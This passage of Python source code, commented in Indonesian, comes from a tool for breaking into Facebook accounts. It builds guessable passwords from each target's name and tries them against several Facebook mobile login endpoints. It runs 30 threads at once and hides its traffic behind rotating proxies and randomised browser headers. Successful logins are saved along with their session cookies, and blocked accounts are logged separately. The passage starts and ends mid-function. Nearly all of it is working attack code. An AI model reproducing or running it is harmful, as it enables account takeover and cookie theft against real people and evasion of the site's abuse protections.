		ualu.append(bzer)
	else:
		ualuh.append('tidak')
	passwrd()
#----------[ BAGIAN-WORDLIST ]----------#	
def passwrd():
	global prog,des
	kopi()
	print('')
	print(f'{kun}{x}[{hijo}•{x}] MAINKAN MODE PESAWAT SETIAP 300 IDZ ')
	kopi()
	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(" ")[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'321')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'06')
						pwv.append(frs+'07')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'321')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'06')
						pwv.append(frs+'07')
				if 'ya' in pwpluss: 
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
				    pool.submit(metod1,idf,pwv)
				elif 'mbasic' in method:
				    pool.submit(metod2,idf,pwv)
				elif 'asyinc' in method:
				    pool.submit(metod3,idf,pwv)
				elif 'mbeta' in method:
				    pool.submit(metod4,idf,pwv)
				elif 'free' in method:
				    pool.submit(metod5,idf,pwv)
				else:
				    pool.submit(metod1,idf,pwv)
				 
	print(f'{kun}{x}[{hijo}•{x}] OK {hijo}: %s'%(ok))
	print(f'{kun}{x}[{hijo}•{x}] CP {kun}: %s'%(cp))
	clear()
#----------[ METODE-VALIDATE ]----------#	
def metod1(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[bold white] Validate [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
	prog.advance(des) 
	ua = random.choice(ugen)
	ua2 = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="{str(rr(8,99))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in ses.cookies.get_dict().keys():
				tree = Tree('')
				tree.add(f'{puti}Login Checkpoint')
				tree.add(f'{kun}{idf}{x}').add(f'{kun}{pw}{x}')
				tree.add(f'{mer}{ua}{x}')
				prints(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')		
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				tree = Tree("")
				tree.add(f'{puti}Login Succesfull')
				tree.add(f'{hijo}{idf}{x}').add(f'{hijo}{pw}{x}')
				tree.add(f'{hijo}{kuki}{x}').add(f'{mer}{ua}{x}')
				prints(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#----------[ METODE-MBASIC ]----------#	
def metod2(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[bold white]Async [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
	prog.advance(des) 
	ua = random.choice(ugen)
	ua2 = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			link = ses.get(f"https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=217709351653383&kid_directed_site=0&app_id=217709351653383&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D217709351653383%26state%3D3bab1cbb3afab985c53e9bab2b703d2b%26response_type%3Dcode%26sdk%3Dphp-sdk-5.7.0%26redirect_uri%3Dhttps%253A%252F%252Fwww.chope.co%252Fuser%252Ffblogin%26scope%3Demail%252Cuser_birthday%252Cpublic_profile%26b_u%3Dhttps%253A%252F%252Fwww.chope.co%252Fsingapore-restaurants%26source%3Dmobilesite%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db2ffd6c8-df73-4fd5-8dbc-91103ed904dc%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.chope.co%2Fuser%2Ffblogin%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D3bab1cbb3afab985c53e9bab2b703d2b%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v3.3/dialog/oauth?client_id=217709351653383&state=3bab1cbb3afab985c53e9bab2b703d2b&response_type=code&sdk=php-sdk-5.7.0&redirect_uri=https%3A%2F%2Fwww.chope.co%2Fuser%2Ffblogin&scope=email%2Cuser_birthday%2Cpublic_profile&b_u=https%3A%2F%2Fwww.chope.co%2Fsingapore-restaurants&source=mobilesite&ret=login&fbapp_pres=0&logger_id=b2ffd6c8-df73-4fd5-8dbc-91103ed904dc&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=217709351653383&kid_directed_site=0&app_id=217709351653383&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D217709351653383%26state%3D3bab1cbb3afab985c53e9bab2b703d2b%26response_type%3Dcode%26sdk%3Dphp-sdk-5.7.0%26redirect_uri%3Dhttps%253A%252F%252Fwww.chope.co%252Fuser%252Ffblogin%26scope%3Demail%252Cuser_birthday%252Cpublic_profile%26b_u%3Dhttps%253A%252F%252Fwww.chope.co%252Fsingapore-restaurants%26source%3Dmobilesite%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db2ffd6c8-df73-4fd5-8dbc-91103ed904dc%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.chope.co%2Fuser%2Ffblogin%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D3bab1cbb3afab985c53e9bab2b703d2b%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict().keys():
				tree = Tree('')
				tree.add(f'{puti}Login Checkpoint')
				tree.add(f'{kun}{idf}{x}').add(f'{kun}{pw}{x}')
				tree.add(f'{mer}{ua}{x}')
				prints(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')		
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				tree = Tree("")
				tree.add(f'{puti}Login Succesfull')
				tree.add(f'{hijo}{idf}{x}').add(f'{hijo}{pw}{x}')
				tree.add(f'{hijo}{kuki}{x}').add(f'{mer}{ua}{x}')
				prints(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#----------[ METODE-ASYINC ]----------#		
def metod3(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[bold white] regular [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
	prog.advance(des) 
	ses = requests.Session()
	for pw in pwv:
		try:
			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			open('socksku.txt','w').write(proxs)
			ua = random.choice(ugen)
			nip=random.choice(proxs)
			proxs= {'http': 'socks5://'+nip}
			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=963854534080071&kid_directed_site=0&app_id=963854534080071&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fapp_id%3D963854534080071%26cbt%3D1674972845841%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2fb8ad423e11e4%2526domain%253Dwww.lita.gg%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.lita.gg%25252Ff13af46acd9ad78%2526relation%253Dopener%26client_id%3D963854534080071%26display%3Dtouch%26domain%3Dwww.lita.gg%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.lita.gg%252Fid%252F%26locale%3Den_US%26logger_id%3Df1b60ee16600908%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df377a8746303574%2526domain%253Dwww.lita.gg%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.lita.gg%25252Ff13af46acd9ad78%2526relation%253Dopener%2526frame%253Df1f529b65a7c774%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv11.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df377a8746303574%26domain%3Dwww.lita.gg%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.lita.gg%252Ff13af46acd9ad78%26relation%3Dopener%26frame%3Df1f529b65a7c774%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr")
			date = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': '0',
'unrecognized_tries': '0',
'email': idf,
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': 'false',
'had_password_prefilled': 'false',
'is_smart_lock': 'true',
'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),
'pass': pw,
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
"__dyn": "",
"__csr": "",
"__a": "",
"__user": "0",
"_fb_noscript": "true"}
			head = {"Host": url,
"content-length": str(rr(2000,2199)),
"sec-ch-ua": f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}"',
"sec-ch-ua-mobile": "?1",
"user-agent": ua,
"viewport-width": "360",
"content-type": "application/x-www-form-urlencoded",
"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
"sec-ch-ua-platform-version": f'"{str(rr(5,12))}.0.0"',
"x-asbd-id": "129477",
"x-requested-with": "com.android.chrome",
"sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
"sec-ch-prefers-color-scheme": "light",
"sec-ch-ua-platform": '"Android"',
"accept": "*/*",
"origin": "https://"+url,
"sec-fetch-site": "same-origin",
"sec-fetch-mode": "cors",
"sec-fetch-dest": "empty",
"referer": f"https://{url}/login.php?skip_api_login=1&api_key=963854534080071&kid_directed_site=0&app_id=963854534080071&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fapp_id%3D963854534080071%26cbt%3D1674972845841%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2fb8ad423e11e4%2526domain%253Dwww.lita.gg%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.lita.gg%25252Ff13af46acd9ad78%2526relation%253Dopener%26client_id%3D963854534080071%26display%3Dtouch%26domain%3Dwww.lita.gg%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.lita.gg%252Fid%252F%26locale%3Den_US%26logger_id%3Df1b60ee16600908%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df377a8746303574%2526domain%253Dwww.lita.gg%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.lita.gg%25252Ff13af46acd9ad78%2526relation%253Dopener%2526frame%253Df1f529b65a7c774%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv11.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df377a8746303574%26domain%3Dwww.lita.gg%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.lita.gg%252Ff13af46acd9ad78%26relation%3Dopener%26frame%3Df1f529b65a7c774%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr",
"accept-encoding": "gzip, deflate, br",
"sec-websocket-version": str(rr(5,13)),
"accept-language": version}
			po = ses.post(f"https://{url}/login/device-based/login/async/?api_key=2099441543493930&auth_token=ed9cb45a485f81810505130bc83f37bb&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fapp_id%3D2099441543493930%26cbt%3D1693466972390%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df263885d940389%2526domain%253Daccount.hoyoverse.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.hoyoverse.com%25252Ff33e116a09cb6c8%2526relation%253Dopener%26client_id%3D2099441543493930%26display%3Dtouch%26domain%3Daccount.hoyoverse.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252F%2523%252Flogin%253Fcb_route%253D%25252Faccount%25252FaccountInfo%26locale%3Did_ID%26logger_id%3Df24ea8b6c2199ac%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df348efd0f31f7e8%2526domain%253Daccount.hoyoverse.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.hoyoverse.com%25252Ff33e116a09cb6c8%2526relation%253Dopener%2526frame%253Df506dad7e5f0a4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv11.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=2099441543493930&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df348efd0f31f7e8%26domain%3Daccount.hoyoverse.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252Ff33e116a09cb6c8%26relation%3Dopener%26frame%3Df506dad7e5f0a4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100", headers=head, data=date, allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f"{k}╭────────────────────────────╮{x}")
				XiaoYan = Tree('')
				XiaoYan.add(f"{k}{idf}{x}").add(f"{k}{pw}{x}")
				#XiaoYan.add(f"{m}{ua}{x}")
				print(f"{k}╰────────────────────────────╯{x}")
				prints(XiaoYan)
				open('/sdcard/CYXIEON-CP/'+cpc,'a').write(idf+'|'+pw+'\n')		
				akunefacebook.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f"{k}╭────────────────────────────╮{x}")
				XiaoYan = Tree("")
				XiaoYan.add(f"\r{h}{idf}{x}").add(f"{h}{pw}{x}").add(f"{h}{kuki}{x}")
				XiaoYan.add(f"{h}{ua}{x}")
				print(f"{k}╰────────────────────────────╯{x}")
				prints(XiaoYan)
				open('/sdcard/CYXIEON-OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#METOD PENGOCOK#
def metod4(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[bold white]New [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
	prog.advance(des) 
	ua = random.choice(ugen)
	ua2 = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get(f"https://free.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr")
			data = {
			   "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
			   "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
			   "uid": idf,
			   "next":"https://free.facebook.com/",
			   "flow":"login_no_pin",
			   "pass": pw}
			headers_post = {
			   "Host": "free.facebook.com",
			   "content-length": "142",
			   "cache-control": "max-age=0",
			   "upgrade-insecure-requests": "1",
			   "origin": "https://free.facebook.com",
			   "content-type": "application/x-www-form-urlencoded",
			   "user-agent": ua,
			   "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			   "x-requested-with": "com.facebook.katana",
			   "sec-fetch-site": "same-origin",
			   "sec-fetch-mode": "navigate",
			   "sec-fetch-user": "?1",
			   "sec-fetch-dest": "document",
			   "referer": f"https://free.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr",
			   "accept-encoding": "gzip, deflate",
			   "accept-language": "id-ID,id;q=0.9,en-GB;q=0.8,en-US;q=0.7,en;q=0.6"}
			po = ses.post("https://free.facebook.com/login/device-based/validate-password/?shbl=0",data=data,headers=headers_post,allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict():
				tree = Tree('')
				tree.add(f'{puti}Login Checkpoint')
				tree.add(f'{kun}{idf}{x}').add(f'{kun}{pw}{x}')
				tree.add(f'{mer}{ua}{x}')
				prints(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')		
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				tree = Tree("")
				tree.add(f'{puti}Login Succesfull')
				tree.add(f'{hijo}{idf}{x}').add(f'{hijo}{pw}{x}')
				tree.add(f'{hijo}{kuki}{x}').add(f'{mer}{ua}{x}')
				prints(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
def metod5(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r{h}V1 {idf}{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]')
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
	ses = requests.Session()
	for pw in pwv:
		try:
